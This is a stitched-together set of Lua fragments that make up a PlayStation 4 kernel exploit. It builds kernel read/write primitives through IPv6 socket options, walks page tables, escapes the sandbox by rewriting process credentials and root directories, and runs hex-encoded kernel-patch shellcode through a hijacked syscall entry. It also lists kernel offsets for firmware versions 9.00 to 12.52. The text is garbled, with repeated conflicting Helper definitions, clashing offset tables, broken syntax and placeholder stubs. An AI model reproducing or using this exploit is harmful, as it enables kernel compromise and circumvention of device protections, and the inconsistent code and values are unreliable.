        Helper.getSockOpt(self.workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14)
    end

    self.ipv6KernelWrite = function(kaddr, bufferAddr)
        self.ipv6WriteToVictim(kaddr)
        Helper.setSockOpt(self.workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14)
    end

    self.ipv6KernelRead8 = function(kaddr)
        self.ipv6KernelRead(kaddr, self.slaveBuffer)
        return self.slaveBuffer:getLong(0)
    end

    self.ipv6KernelWrite8 = function(kaddr, val)
        self.slaveBuffer:putLong(0, val)
        self.slaveBuffer:putLong(8, 0)
        self.slaveBuffer:putInt(16, 0)
        self.ipv6KernelWrite(kaddr, self.slaveBuffer)
    end

    self.copyout = function(kaddr, uaddr, len)
```

local Helper = Helper or {}

local syscallWrappers = {}

Helper.SYS_WRITE = 4
Helper.SYS_READ = 3
Helper.IPPROTO_IPV6 = 41
Helper.IPV6_PKTINFO = 9
Helper.IPV6_NEXTHOP = 8

Helper.setSockOpt = function(sock, level, optname, optval, optlen)
    -- Placeholder implementation
    print("setSockOpt", sock, level, optname, optval, optlen)
end

Helper.getSockOpt = function(sock, level, optname, optval, optlen)
    -- Placeholder implementation
    print("getSockOpt", sock, level, optname, optval, optlen)
    return 0
end

local KernelOffset = KernelOffset or {}
KernelOffset.SIZEOF_OFILES = 8
KernelOffset.SO_PCB = 360
KernelOffset.INPCB_PKTOPTS = 72
KernelOffset.PROC_COMM = 352
KernelOffset.PROC_PID = 208
KernelOffset.PROC_VM_SPACE = 320
KernelOffset.VMSPACE_VM_PMAP = 8
KernelOffset.PMAP_CR3 = 32

local addr = addr or {}

local KernelRW = KernelRW or {}

local function isKernelRWAvailable()
    return KernelRW.kernelRW ~= nil
end

KernelRW.new = function(masterSock, masterTargetBuffer, readMem, pipeReadFd, pipeWriteFd, pipeAddr)
    local self = {}
    self.masterSock = masterSock
    self.masterTargetBuffer = masterTargetBuffer
    self.readMem = readMem
    self.pipeReadFd = pipeReadFd
    self.pipeWriteFd = pipeWriteFd
    self.pipeAddr = pipeAddr
    self.pipemapBuffer = Buffer.new(24)
    
    local function ipv6KernelWrite(addr, buf)
        local target = self.masterTargetBuffer
        target:putLong(0, addr)
        target:putLong(8, 0)
        target:putInt(16, 0)
        Helper.setSockOpt(self.masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, target, 20)

        Helper.syscall(Helper.SYS_WRITE, self.pipeWriteFd, buf.address, buf.capacity)
    end

    local function ipv6KernelRead8(addr)
        local target = self.masterTargetBuffer
        target:putLong(0, addr)
        target:putLong(8, 0)
        target:putInt(16, 0)
        Helper.setSockOpt(self.masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, target, 20)
        Helper.syscall(Helper.SYS_READ, self.pipeReadFd, self.readMem.address, 8)
        return self.readMem:getLong(0)
    end
    
    self.ipv6KernelWrite = ipv6KernelWrite
    self.ipv6KernelRead8 = ipv6KernelRead8
    
    self.initializePipeRW = function()
        ipv6KernelWrite(self.pipeAddr + 0x20, self.masterTargetBuffer)
    end
    
    self.copyout = function(kaddr, uaddr, len)
        self.pipemapBuffer:putLong(0, 0x4000000040000000)
        self.pipemapBuffer:putLong(8, 0x4000000000000000)
        self.pipemapBuffer:putInt(16, 0)
        ipv6KernelWrite(self.pipeAddr, self.pipemapBuffer)

        self.pipemapBuffer:putLong(0, kaddr)
        self.pipemapBuffer:putLong(8, 0)
        self.pipemapBuffer:putInt(16, 0)
        ipv6KernelWrite(self.pipeAddr + 0x10, self.pipemapBuffer)
        
        Helper.syscall(Helper.SYS_READ, self.pipeReadFd, uaddr, len)
    end

    self.copyin = function(uaddr, kaddr, len)
        self.pipemapBuffer:putLong(0, 0)
        self.pipemapBuffer:putLong(8, 0x4000000000000000)
        self.pipemapBuffer:putInt(16, 0)
        ipv6KernelWrite(self.pipeAddr, self.pipemapBuffer)

        self.pipemapBuffer:putLong(0, kaddr)
        self.pipemapBuffer:putLong(8, 0)
        self.pipemapBuffer:putInt(16, 0)
        ipv6KernelWrite(self.pipeAddr + 0x10, self.pipemapBuffer)

        Helper.syscall(Helper.SYS_WRITE, self.pipeWriteFd, uaddr, len)
    end

    self.readBuffer = function(kaddr, buf, len)
        local mem = self.readMem
        self:copyout(kaddr, mem.address, len)
        for i = 0, len - 1 do
            buf:putByte(i, mem:getByte(i))
        end
    end

    self.writeBuffer = function(kaddr, buf, len)
        self:copyin(buf.address, kaddr, len)
    end

    self.getFdDataAddr = function(sock)
        local filedescentAddr = self.curprocOfiles + sock * KernelOffset.SIZEOF_OFILES
        local fileAddr = ipv6KernelRead8(filedescentAddr + 0x0)
        return ipv6KernelRead8(fileAddr + 0x0)
    end

    self.getSockPktopts = function(sock)
        local fdData = self:getFdDataAddr(sock)
        local pcb = ipv6KernelRead8(fdData + KernelOffset.SO_PCB)
        return ipv6KernelRead8(pcb + KernelOffset.INPCB_PKTOPTS)
    end
    
    self.setupPktinfo = function(workerPktopts)
        self.masterTargetBuffer:putLong(0, workerPktopts + 0x10)
        self.masterTargetBuffer:putLong(8, 0)
        self.masterTargetBuffer:putInt(16, 0)
        Helper.setSockOpt(self.masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, self.masterTargetBuffer, 0x14)
        
        self:initializePipeRW()
    end
    
    self.kread8 = function(addr)
        local buf = Buffer.new(8)
        self:readBuffer(addr, buf, 8)
        return buf:getLong(0)
    end
    
    self.kwrite8 = function(addr, val)
        local buf = Buffer.new(8)
        buf:putLong(0, val)
        self:writeBuffer(addr, buf, 8)
    end
    
    self.kread32 = function(addr)
        local buf = Buffer.new(4)
        self:readBuffer(addr, buf, 4)
        return buf:getInt(0)
    end
    
    self.kwrite32 = function(addr, val)
        local buf = Buffer.new(4)
        buf:putInt(0, val)
        self:writeBuffer(addr, buf, 4)
    end
    
    return self
end

local function readNullTerminatedString(kaddr)
    if not isKernelRWAvailable() then
        return ""
    end
    
    local sb = ""
    
    while #sb < 1000 do
        local value = KernelRW.kernelRW:kread8(kaddr)
        
        for i = 0, 7 do
            local b = (value >> (i * 8)) & 0xFF
            if b == 0 then
                return sb
            end
            if b >= 32 and b <= 126 then
                sb = sb .. string.char(b & 0xFF)
            else
                return sb
            end
        end
        
        kaddr = kaddr + 8
    end
    
    return sb
end

local function slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, addr)
    local len = 8
    local offset = 0

    for i = 0, len - 1 do
        readBuf:putByte(i, 0)
    end

    while offset < len do
        pktinfo:putLong(8, addr + offset)
        Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, pktinfo, pktinfoLen)
        
        local tempBuf = Buffer.new(len - offset)
        local n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset)

        if n == 0 then
            readBuf:putByte(offset, 0)
            offset = offset + 1
        else
            for i = 0, n - 1 do
                readBuf:putByte(offset + i, tempBuf:getByte(i))
            end
            offset = offset + n
        end
    end

    return readBuf:getLong(0)
end

local function getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, sock, curprocOfiles)
    local filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES
    local fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0)
    return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0)
end

local function findProcByName(name)
    if not isKernelRWAvailable() then
        return 0
    end
    
    local proc = KernelRW.kernelRW:kread8(addr.allproc)
    local count = 0
    
    while proc ~= 0 and count < 100 do
        local procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM)
        if name == procName then
            return proc
        end
        proc = KernelRW.kernelRW:kread8(proc + 0x0)
        count = count + 1
    end

    return 0
end

local function findProcByPid(pid)
    if not isKernelRWAvailable() then
        return 0
    end
    
    local proc = KernelRW.kernelRW:kread8(addr.allproc)
    local count = 0
    
    while proc ~= 0 and count < 100 do
        local procPid = KernelRW.kernelRW:kread32(proc + KernelOffset.PROC_PID)
        if procPid == pid then
            return proc
        end
        proc = KernelRW.kernelRW:kread8(proc + 0x0)
        count = count + 1
    end

    return 0
end

local function getProcCr3(proc)
    local vmspace = KernelRW.kernelRW:kread8(proc + KernelOffset.PROC_VM_SPACE)
    local pmapStore = KernelRW.kernelRW:kread8(vmspace + KernelOffset.VMSPACE_VM_PMAP)
    return KernelRW.kernelRW:kread8(pmapStore + KernelOffset.PMAP_CR3)
end

local function virtToPhys(virtAddr, cr3)
    if cr3 == 0 then
        cr3 = addr.kernelCr3
    end
    return cpuWalkPt(cr3, virtAddr)
end

local function physToDmap(physAddr)
    return addr.dmapBase + physAddr
end

local CPU_PG_PHYS_FRAME = 0x000ffffffffff000
local CPU_PG_PS_FRAME = 0x000fffffffe00000

local function cpuPdeField(pde, field)
    local shift = 0
    local mask = 0
    
    if field == "PRESENT" then shift = 0; mask = 1 end
    elseif field == "RW" then shift = 1; mask = 1 end
    elseif field == "USER" then shift = 2; mask = 1 end
    elseif field == "PS" then shift = 7; mask = 1 end
    elseif field == "EXECUTE_DISABLE" then shift = 63; mask = 1 end
    
    return (pde >> shift) & mask
end

local function cpuWalkPt(cr3, vaddr)
    local pml4eIndex = (vaddr >> 39) & 0x1ff
    local pdpeIndex = (vaddr >> 30) & 0x1ff
    local pdeIndex = (vaddr >> 21) & 0x1ff
    local pteIndex = (vaddr >> 12) & 0x1ff

    local pml4e = KernelRW.kernelRW:kread8(physToDmap(cr3) + pml4eIndex * 8)
    if cpuPdeField(pml4e, "PRESENT") ~= 1 then
        return 0
    end
end


```lua
local Helper = Helper or {}
local addr = addr or {}
local KernelOffset = KernelOffset or {}

function translateVaddr(vaddr)
    local pml4Index = bit.rshift(vaddr, 39) & 0x1ff
    local pdpeIndex = bit.rshift(vaddr, 30) & 0x1ff
    local pdeIndex = bit.rshift(vaddr, 21) & 0x1ff
    local pteIndex = bit.rshift(vaddr, 12) & 0x1ff

    local cr3 = kernelRW.kread8(addr.pmap + 0x28)
    local pml4Va = physToDmap(cr3) + pml4Index * 8
    local pml4e = kernelRW.kread8(pml4Va)

    if (cpuPdeField(pml4e, "PRESENT") ~= 1) then
        return 0
    end

    -- pdp
    local pdpBasePa = pml4e & CPU_PG_PHYS_FRAME
    local pdpeVa = physToDmap(pdpBasePa) + pdpeIndex * 8
    local pdpe = kernelRW.kread8(pdpeVa)

    if (cpuPdeField(pdpe, "PRESENT") ~= 1) then
        return 0
    end

    -- pd
    local pdBasePa = pdpe & CPU_PG_PHYS_FRAME
    local pdeVa = physToDmap(pdBasePa) + pdeIndex * 8
    local pde = kernelRW.kread8(pdeVa)

    if (cpuPdeField(pde, "PRESENT") ~= 1) then
        return 0
    end

    -- large page
    if (cpuPdeField(pde, "PS") == 1) then
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffff)
    end

    -- pt
    local ptBasePa = pde & CPU_PG_PHYS_FRAME
    local pteVa = physToDmap(ptBasePa) + pteIndex * 8
    local pte = kernelRW.kread8(pteVa)

    if (cpuPdeField(pte, "PRESENT") ~= 1) then
        return 0
    end

    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fff)
end

function postExploitationPS4()
    if (addr.curproc == 0 or addr.insideKdata == 0) then
        return false
    end

    local evfPtr = addr.insideKdata

    local evfString = readNullTerminatedString(evfPtr)
    if (evfString ~= "evf cv") then
        return false
    end

    addr.dataBase = evfPtr - KernelOffset.getPS4Offset("EVF_OFFSET")

    if (not verifyElfHeader()) then
        return false
    end

    if (not escapeSandbox(addr.curproc)) then
        return false
    end

    applyKernelPatchesPS4()


    return true
end

local function verifyElfHeader()
    local headerValue = kernelRW.kread8(addr.dataBase)

    local b0 = bit.band(headerValue, 0xFF)
    local b1 = bit.band(bit.rshift(headerValue, 8), 0xFF)
    local b2 = bit.band(bit.rshift(headerValue, 16), 0xFF)
    local b3 = bit.band(bit.rshift(headerValue, 24), 0xFF)


    if (b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46) then
        return true
    else
    end

    return false
end

local function escapeSandbox(curproc)

    if (bit.rshift(curproc, 48) ~= 0xFFFF) then
        return false
    end

    local PRISON0 = addr.dataBase + KernelOffset.getPS4Offset("PRISON0")
    local ROOTVNODE = addr.dataBase + KernelOffset.getPS4Offset("ROOTVNODE")
    local OFFSET_P_UCRED = 0x40

    local procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD)
    local ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED)

    if (bit.rshift(procFd, 48) ~= 0xFFFF or bit.rshift(ucred, 48) ~= 0xFFFF) then
        return false
    end


    kernelRW.kwrite32(ucred + 0x04, 0) -- cr_uid
    kernelRW.kwrite32(ucred + 0x08, 0) -- cr_ruid
    kernelRW.kwrite32(ucred + 0x0C, 0) -- cr_svuid
    kernelRW.kwrite32(ucred + 0x10, 1) -- cr_ngroups
    kernelRW.kwrite32(ucred + 0x14, 0) -- cr_rgid

    local prison0 = kernelRW.kread8(PRISON0)
    if (bit.rshift(prison0, 48) ~= 0xFFFF) then
        return false
    end
    kernelRW.kwrite8(ucred + 0x30, prison0)

    -- Add JIT privileges
    kernelRW.kwrite8(ucred + 0x60, -1)
    kernelRW.kwrite8(ucred + 0x68, -1)

    local rootvnode = kernelRW.kread8(ROOTVNODE)
    if (bit.rshift(rootvnode, 48) ~= 0xFFFF) then
        return false
    end
    kernelRW.kwrite8(procFd + 0x10, rootvnode) -- fd_rdir
    kernelRW.kwrite8(procFd + 0x18, rootvnode) -- fd_jdir


    return true
end

local function applyKernelPatchesPS4()

    local shellcode = KernelOffset.getKernelPatchesShellcode()
    if (#shellcode == 0) then
        return
    end


    local mappingAddr = 0x920100000
    local shadowMappingAddr = 0x926100000

    local sysent661Addr = addr.dataBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET")
    local syNarg = kernelRW.kread32(sysent661Addr)
    local syCall = kernelRW.kread8(sysent661Addr + 8)
    local syThrcnt = kernelRW.kread32(sysent661Addr + 0x2c)

    kernelRW.kwrite32(sysent661Addr, 2)
    kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"))
    kernelRW.kwrite32(sysent661Addr + 0x2c, 1)

    local PROT_READ = 0x1
    local PROT_WRITE = 0x2
    local PROT_EXEC = 0x4
    local PROT_RW = bit.bor(PROT_READ, PROT_WRITE)
    local PROT_RWX = bit.bor(bit.bor(PROT_READ, PROT_WRITE), PROT_EXEC)

    local alignedMemsz = 0x10000

    -- create shm with exec permission
    local execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0, alignedMemsz, PROT_RWX)

    -- create shm alias with write permission
    local writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, PROT_RW)

    -- map shadow mapping and write into it
    Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, alignedMemsz, PROT_RW, 0x11, writeHandle, 0)

    for i = 1, #shellcode do
        api.write8(shadowMappingAddr + i - 1, shellcode[i])
    end

    -- map executable segment
    Helper.syscall(Helper.SYS_MMAP, mappingAddr, alignedMemsz, PROT_RWX, 0x11, execHandle, 0)

    Helper.syscall(Helper.SYS_KEXEC, mappingAddr)


    kernelRW.kwrite32(sysent661Addr, syNarg)
    kernelRW.kwrite8(sysent661Addr + 8, syCall)
    kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt)

    Helper.syscall(Helper.SYS_CLOSE, writeHandle)

end

function setKernelAddresses(curproc, curprocOfiles, insideKdata, allproc)
    addr.curproc = curproc
    addr.curprocOfiles = curprocOfiles
    addr.insideKdata = insideKdata
    addr.allproc = allproc
end

function isKernelRWAvailable()
    return kernelRW ~= nil and addr.isInitialized()
end

function initializeKernelOffsets()
    KernelOffset.initializeFromHelper()
end

KernelOffset.PROC_PID = 0xb0
KernelOffset.PROC_FD = 0x48
KernelOffset.PROC_VM_SPACE = 0x200
KernelOffset.PROC_COMM = 0x448
KernelOffset.PROC_SYSENT = 0x470

-- filedesc
KernelOffset.FILEDESC_OFILES = 0x0
KernelOffset.SIZEOF_OFILES = 0x8

-- vmspace structure
KernelOffset.VMSPACE_VM_PMAP = 0x1C8
KernelOffset.VMSPACE_VM_VMID = 0x1D4

-- pmap structure
KernelOffset.PMAP_CR3 = 0x28

-- network
KernelOffset.SO_PCB = 0x18
KernelOffset.INPCB_PKTOPTS = 0x118

-- PS4 IPv6 structure
KernelOffset.PS4_OFF_TCLASS = 0xb0
KernelOffset.PS4_OFF_IP6PO_RTHDR = 0x68

local ps4KernelOffsets = {}
local shellcodeData = {}
local currentFirmware = nil

local function addFirmwareOffsets(firmware, evf_offset, sysent_661_offset, prison0, rootvnode, jmp_rsi_gadget, kexec, evf_offset2)
    ps4KernelOffsets[firmware] = {
        EVF_OFFSET = evf_offset,
        SYSENT_661_OFFSET = sysent_661_offset,
        PRISON0 = prison0,
        ROOTVNODE = rootvnode,
        JMP_RSI_GADGET = jmp_rsi_gadget,
        KEXEC = kexec,
        EVF_OFFSET2 = evf_offset2
    }
end

local function initializePS4Offsets()
    -- PS4 9.00
    addFirmwareOffsets("9.00", 0x7f6f27, 0x111f870, 0x21eff20, 0x221688d, 0x1107f00, 0x4c7ad, 0x3977F0)

    -- PS4 9.03/9.04
    addFirmwareOffsets("9.03", 0x7f4ce7, 0x111b840, 0x21ebf20, 0x221288d, 0x1103f00, 0x5325b, 0x3959F0)
    addFirmwareOffsets("9.04", 0x7f4ce7, 0x111b840, 0x21ebf20, 0x221288d, 0x1103f00, 0x5325b, 0x3959F0)

    -- PS4 9.50/9.51/9.60
    addFirmwareOffsets("9.50", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)
end
```

```lua
local Helper = {}

Helper.firmwareOffsets = {}
Helper.shellcodeData = {}
Helper.syscallWrappers = {}

function Helper.addFirmwareOffsets(firmware, value1, value2, value3, value4, value5, value6, value7)
    Helper.firmwareOffsets[firmware] = {
        value1 = value1,
        value2 = value2,
        value3 = value3,
        value4 = value4,
        value5 = value5,
        value6 = value6,
        value7 = value7
    }
end

function Helper.initializeFirmwareOffsets()
    -- PS4 9.00
    Helper.addFirmwareOffsets("9.00", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)

    -- PS4 9.03
    Helper.addFirmwareOffsets("9.03", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)

    -- PS4 9.50/9.51/9.60
    Helper.addFirmwareOffsets("9.50", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)
    Helper.addFirmwareOffsets("9.51", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)
    Helper.addFirmwareOffsets("9.60", 0x769a88, 0x11137d0, 0x21a6c30, 0x221a40d, 0x1100ee0, 0x15a6d, 0x85EE0)

    -- PS4 10.00/10.01
    Helper.addFirmwareOffsets("10.00", 0x7b5133, 0x111b8b0, 0x1b25bd0, 0x1b9e08d, 0x110a980, 0x68b1, 0x45B10)
    Helper.addFirmwareOffsets("10.01", 0x7b5133, 0x111b8b0, 0x1b25bd0, 0x1b9e08d, 0x110a980, 0x68b1, 0x45B10)

    -- PS4 10.50/10.70/10.71
    Helper.addFirmwareOffsets("10.50", 0x7a7b14, 0x111b910, 0x1bf81f0, 0x1be460d, 0x110a5b0, 0x50ded, 0x25E330)
    Helper.addFirmwareOffsets("10.70", 0x7a7b14, 0x111b910, 0x1bf81f0, 0x1be460d, 0x110a5b0, 0x50ded, 0x25E330)
    Helper.addFirmwareOffsets("10.71", 0x7a7b14, 0x111b910, 0x1bf81f0, 0x1be460d, 0x110a5b0, 0x50ded, 0x25E330)

    -- PS4 11.00
    Helper.addFirmwareOffsets("11.00", 0x7fc26f, 0x111f830, 0x2116640, 0x221c60d, 0x1109350, 0x71a21, 0x58F10)

    -- PS4 11.02
    Helper.addFirmwareOffsets("11.02", 0x7fc22f, 0x111f830, 0x2116640, 0x221c60d, 0x1109350, 0x71a21, 0x58F10)

    -- PS4 11.50/11.52
    Helper.addFirmwareOffsets("11.50", 0x784318, 0x111fa18, 0x2136e90, 0x21cc60d, 0x110a760, 0x704d5, 0xE6C20)
    Helper.addFirmwareOffsets("11.52", 0x784318, 0x111fa18, 0x2136e90, 0x21cc60d, 0x110a760, 0x704d5, 0xE6C20)

    -- PS4 12.00/12.02
    Helper.addFirmwareOffsets("12.00", 0x784798, 0x111fa18, 0x2136e90, 0x21cc60d, 0x110a760, 0x47b31, 0xE6C20)
    Helper.addFirmwareOffsets("12.02", 0x784798, 0x111fa18, 0x2136e90, 0x21cc60d, 0x110a760, 0x47b31, 0xE6C20)

    -- PS4 12.50/12.52, fill only really needed ones
    Helper.addFirmwareOffsets("12.50", 0, 0x111fa18, 0x2136e90, 0, 0x110a760, 0x47b31, 0xE6C20)
    Helper.addFirmwareOffsets("12.52", 0, 0x111fa18, 0x2136e90, 0, 0x110a760, 0x47b31, 0xE6C20)
end

function Helper.initializeShellcodes()
    Helper.shellcodeData = {}

    Helper.shellcodeData["9.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b08000000000066448989c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["9.03"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000ebc7818d0b0800000000006644898994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["9.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00ebc7813d6d1900000000006644898924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["10.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b990e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600ebc7817d2039000000000066448989a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["10.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb0000006689811330210041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800ebc781eeb2470000000000668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["11.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300ebc781eec8350000000000668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["11.02"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300ebc7810ec935000000000066898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["11.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900ebc781aebe2f000000000066898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"

    Helper.shellcodeData["12.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
end
```

```lua
local Helper = require("Helper")

local Lapse = {}

Lapse.MAIN_CORE = 4
Lapse.MAIN_RTPRIO = 0x100
Lapse.NUM_WORKERS = 2
Lapse.NUM_GROOMS = 0x200
Lapse.NUM_SDS = 64
Lapse.NUM_SDS_ALT = 48
Lapse.NUM_RACES = 100
Lapse.NUM_ALIAS = 100
Lapse.NUM_HANDLES = 0x100
Lapse.LEAK_LEN = 16
Lapse.NUM_LEAKS = 16
Lapse.NUM_CLOBBERS = 8

local blockFd = -1
local unblockFd = -1
local blockId = -1
local groomIds = nil
local sockets = nil
local socketsAlt = nil
local previousCore = -1
local kernelRW = nil

-- Kernel leak results from Stage 2
local reqs1Addr = nil
local kbufAddr = nil
local kernelAddr = nil
local targetId = nil
local evf = nil
local fakeReqs3Addr = nil
local fakeReqs3Sd = nil
local aioInfoAddr = nil

local console = nil
local api = Helper.api

-- Initialize shellcodeData here
local shellcodeData = {}

local ps4KernelOffsets = {}

function Kernel.initializeKernelOffsets()
    Offsets.addFirmwareOffsets("9.00", 0xFFFFFFFF8242CE00, 0xFFFFFFFF826620E0, 0xFFFFFFFF826621B0, 0x3F8, 0xFFFFFFFF8262F710, 0xFFFFFFFF8245171E, 0xFFFFFFFF82696E40)
    Offsets.addFirmwareOffsets("9.03", 0xFFFFFFFF8242DE00, 0xFFFFFFFF826630E0, 0xFFFFFFFF826631B0, 0x3F8, 0xFFFFFFFF82630710, 0xFFFFFFFF8245271E, 0xFFFFFFFF82697E40)
    Offsets.addFirmwareOffsets("9.04", 0xFFFFFFFF8242DE00, 0xFFFFFFFF826630E0, 0xFFFFFFFF826631B0, 0x3F8, 0xFFFFFFFF82630710, 0xFFFFFFFF8245271E, 0xFFFFFFFF82697E40)
    Offsets.addFirmwareOffsets("9.50", 0xFFFFFFFF82437E00, 0xFFFFFFFF8266D0E0, 0xFFFFFFFF8266D1B0, 0x3F8, 0xFFFFFFFF8263A710, 0xFFFFFFFF8245C71E, 0xFFFFFFFF826A1E40)
